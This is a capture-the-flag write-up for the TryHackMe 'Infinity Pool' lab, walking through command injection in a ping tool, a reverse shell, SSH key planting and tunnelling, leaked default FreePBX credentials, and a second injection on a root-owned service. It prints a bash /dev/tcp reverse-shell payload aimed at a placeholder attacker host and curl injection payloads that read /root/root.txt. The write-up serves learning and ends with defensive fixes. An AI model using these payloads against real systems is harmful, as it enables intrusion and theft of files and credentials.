# Infinity Pool — TryHackMe Write-up

**Platform:** TryHackMe (Hacker Holidays — Byte Lotus Hotel, Day 11)
**Room:** Infinity Pool
**Attacking Machine:** Kali Linux (`ninjax@ninjax`)


---

## 1. Overview

Infinity Pool is a Flask/Gunicorn box built around a fictional hotel's internal network — the story is that guests were never meant to see any of this, which turns out to be literally true once you start pulling on `robots.txt`. The path to root is a chain of three separate command-injection-flavoured issues stacked across three internal services, tied together by one leaked credential and an SSH tunnel:

1. **Command injection** in a public "sister-property connectivity" ping tool → shell as `web`.
2. Pivoting internally to find two more services (`automation`, `watchtower`) that aren't exposed externally at all — only discoverable from inside the box.
3. A leaked FreePBX **default credential** reached via SSH local-port-forwarding, used to dig up a Bearer token hidden in a voicemail widget.
4. That token unlocks a second, root-owned service with its **own command injection**, which is the actual privilege escalation.

Nothing here is a kernel exploit or a CVE — it's entirely "internal services trusting each other a bit too much," which is a very realistic way real networks get owned.

---

## 2. Reconnaissance

Standard opener:

```bash
nmap -Pn -sC -sV <TARGET_IP>
```

**Result:** two ports — SSH (22) and a Gunicorn web server (80). The Gunicorn `Server` header is a useful tell on its own: it's a Python WSGI server, not a full web server, so whatever's listening behind it is almost certainly hand-rolled in Flask or Django, meaning bugs are more likely to be app-logic issues than a known off-the-shelf CVE.

The scan also pulled the page and, more usefully, `robots.txt`, which disallowed two paths: `/internal/` and `/status`. Checking `robots.txt` early is basically free and it's a very common way developers accidentally hand you a map — they hide an endpoint from crawlers without actually restricting access to it.

---

## 3. Mapping the App

Browsing to `/status` turned up a "sister-property connectivity" tool — a small form that looked like a network diagnostic/ping utility. Anything that takes an IP/hostname from the user and (presumably) shells out to `ping` behind the scenes is a textbook command-injection candidate, so before touching it directly I checked the page source and found an `app.js` file confirming the shape of things: `/status` posts to `/internal/netcheck`, and `/internal/` — despite being disallowed in `robots.txt` — was still reachable.

---

## 4. Command Injection #1 — The Public Connectivity Tool → Shell as `web`

Given the form's purpose, the first thing to try is a semicolon to break out of the expected `ping <host>` command:

```
10.0.0.5; whoami
```

Submitted through the form, this came back with `web` — confirmation that user input was going straight into a shell command with no sanitisation, and that the web server process runs as the `web` user.

A one-shot command via HTTP is limited, so the next move is to upgrade to an interactive reverse shell. Listener on the attack box:

```bash
nc -lvnp 4444
```

Payload through the same injection point:

```
10.0.0.5; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

The listener caught a connection almost immediately, giving an interactive shell as `web`. From there, the **user flag** was sitting in `/home/web`.

---

## 5. Privilege Escalation Recon — Looking Sideways, Not Just Up

With a shell in hand, the reflex checks first — SUID/SGID binaries and `sudo -l`:

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
sudo -l
```

Nothing unusual in the SUID/SGID list (the usual `sudo`, `passwd`, `su`, `mount`), and `sudo -l` wanted a password I didn't have. Dead end for the classic checklist — so instead of reaching for LinPEAS immediately, I stepped back and looked at where I actually was: inside `/var/www/infinity_pool/edge/`, which was clearly the directory backing the service I'd just exploited. Listing the parent directory:

```bash
ls -la /var/www/infinity_pool/
```

turned up two sibling directories alongside `edge`:

- `automation` — owned by root, permissions locked down to root-only (`drwxr-x---`)
- `watchtower` — owned by a `svc-watch` user

Different owning users for sibling app directories is a strong signal that each one backs a separate running service under a separate account — worth confirming with the process list rather than assuming:

```bash
ps aux | grep -E "automation|edge|watchtower"
```

This confirmed it directly: `automation` was running as **root**, bound to `127.0.0.1:9000` (localhost-only); `watchtower` was running as `svc-watch` on port 3000; `edge` was the one already compromised, running as `web`. A root-owned service bound to localhost is exactly the kind of target you want once you already have a foothold — any bug in it is a direct route to root.

---

## 6. Exploring the Internal Services

`watchtower` (port 3000) responded to a plain `curl` from inside the box with an "ops console" dashboard that listed its own available endpoints at the bottom of the page: `/api/health` and `/api/config`. Checking `/api/config` directly paid off — it returned a JSON blob containing:

- The `automation` service's internal endpoint (`http://127.0.0.1:9000`), confirming the relationship between the two services.
- FreePBX User Control Panel (UCP) credentials — a username following FreePBX's default template-account naming pattern, and a password — along with an internal note stating outright that the UCP was still on default template credentials and needed rotating. That note is effectively confirmation that these creds were live and unchanged.
- The UCP portal's internal URL, bound to `127.0.0.1:8080`.

Checking `automation`'s own health endpoint filled in the last piece:

```bash
curl http://127.0.0.1:9000/health
```

The response described a `/jobs/export` endpoint that takes a `report` field and requires a Bearer token referred to as an "automation key," and stated outright that the service `runs_as: root`. So the shape of the attack was now clear: find the automation key, then see if `/jobs/export` has the same kind of input-sanitisation problem the public ping tool did.

---

## 7. Reaching an Internal-Only Port — SSH Local Forwarding

The UCP portal (port 8080) was only reachable from the target's own localhost, so it wasn't directly browsable from my attack machine. The clean way to reach an internal-only port when you already have shell access as a user with SSH available is to tunnel through SSH itself rather than trying to pivot some other way.

I generated a throwaway key pair dedicated to this engagement (isolating it from my personal keys is just good practice):

```bash
ssh-keygen -t rsa -f ~/.ssh/id_rsa_web -N ""
```

Then, from the existing reverse shell, dropped the public key into the `web` user's `authorized_keys`:

```bash
mkdir -p /home/web/.ssh
echo "<public key contents>" >> /home/web/.ssh/authorized_keys
chmod 600 /home/web/.ssh/authorized_keys
chmod 700 /home/web/.ssh
```

With key-based auth in place, I opened an SSH connection with local port forwarding, mapping my own port 8080 to the target's `127.0.0.1:8080`:

```bash
ssh -i ~/.ssh/id_rsa_web -L 8080:127.0.0.1:8080 web@<TARGET_IP>
```

From that point, `http://127.0.0.1:8080/ucp/` on my own machine was transparently proxied to the internal-only UCP portal on the target.

---

## 8. Digging the Automation Key Out of FreePBX

Logging into the UCP with the credentials pulled from `watchtower`'s config worked immediately. With no dashboards configured by default, I created one and started adding widgets to see what each one exposed — this is basically just enumerating the app's own surface area from the inside. After trying a few, a **Voicemail widget** displayed the automation key in plain text — an internal API token surfaced through an unrelated admin UI feature, which is a good reminder that "authenticated dashboard" doesn't mean every widget on it is scoped sensibly.

With the key in hand, I went back to the `automation` service. A baseline request first, to see the expected shape of a legitimate call:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer <automation_key>' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test"}'
```

---

## 9. Command Injection #2 — The Root Service → Root Flag

Given the pattern from the first vulnerable service, the obvious next test was whether `report` gets passed into a shell the same unsanitised way. A semicolon-terminated payload:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer <automation_key>' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;whoami;#"}'
```

The response's output field came back `root` — command injection confirmed, on a service that runs as root. From there it's a straight line to the flag: list `/root` to confirm `root.txt` exists, then read it, both through the same injection point:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer <automation_key>' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;ls -la /root;#"}'

curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer <automation_key>' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;cat /root/root.txt;#"}'
```

**Root flag** retrieved via a second command injection, reached only because the first foothold let me discover and reach two internal-only services that were never meant to be exposed at all.

---

## 10. Root Cause Summary

| # | Weakness | Where | Real-world equivalent |
|---|----------|-------|------------------------|
| 1 | `robots.txt` used as access control instead of documentation | `/internal/`, `/status` | Security through obscurity — hiding an endpoint from crawlers isn't restricting access to it |
| 2 | OS command injection — unsanitised input into a shell `ping` call | `/status` → `/internal/netcheck` | OWASP Top 10 — Injection |
| 3 | Internal service trusted its network position instead of authenticating callers properly | `watchtower` dashboard/API | Flat internal network, implicit trust between services |
| 4 | Default/template vendor credentials never rotated | FreePBX UCP | Unchanged default credentials |
| 5 | Sensitive API token exposed through an unrelated admin UI feature | UCP voicemail widget | Secret sprawl across unrelated app surfaces |
| 6 | Second OS command injection — same class of bug, now on a **root-owned** service | `automation` `/jobs/export` | Repeated injection pattern across a codebase, this time with no privilege boundary to fall back on |

### Suggested fixes (for a real environment)
- Never treat `robots.txt` as an access control mechanism — anything sensitive needs real authentication/authorization, not a polite request to crawlers.
- Never pass user input into a shell command; use a proper subprocess call with an argument list (`shell=False`) and validate that "host" is actually a well-formed hostname/IP first.
- Internal services should still authenticate every caller, even ones on `127.0.0.1` — network position isn't identity.
- Rotate default/template vendor credentials before any deployment, and don't leave "please rotate this" notes as a substitute for actually rotating it.
- Scope API tokens narrowly and don't surface them through unrelated admin widgets.
- Treat "runs as root" services as requiring the *highest* input-sanitisation bar, not an afterthought.

---

## 11. Timeline / Methodology Recap

1. `nmap` → SSH (22) and Gunicorn/Flask (80).
2. `robots.txt` → disallowed `/internal/` and `/status`, checked anyway.
3. `/status` page + `app.js` → found the connectivity tool and its real POST target (`/internal/netcheck`).
4. Command injection in the ping tool (`; whoami`) → confirmed → upgraded to a full reverse shell → **user.txt**.
5. SUID/SGID and `sudo -l` checks came up empty → pivoted to inspecting sibling app directories instead.
6. Found `automation` (root, port 9000, localhost-only) and `watchtower` (svc-watch, port 3000) via `ps aux`.
7. `watchtower`'s `/api/config` leaked FreePBX UCP credentials and confirmed the relationship to `automation`.
8. `automation`'s `/health` revealed a Bearer-token-gated `/jobs/export` endpoint running as root.
9. Generated a dedicated SSH key, dropped it into `web`'s `authorized_keys`, and used `ssh -L` to forward the internal-only UCP port (8080) to my attack machine.
10. Logged into UCP with the leaked credentials → found the automation key hidden in a voicemail widget.
11. Command injection in `/jobs/export` (`; whoami` → `root`) → confirmed → read **root.txt** directly through the injection point.

---

*End of write-up.*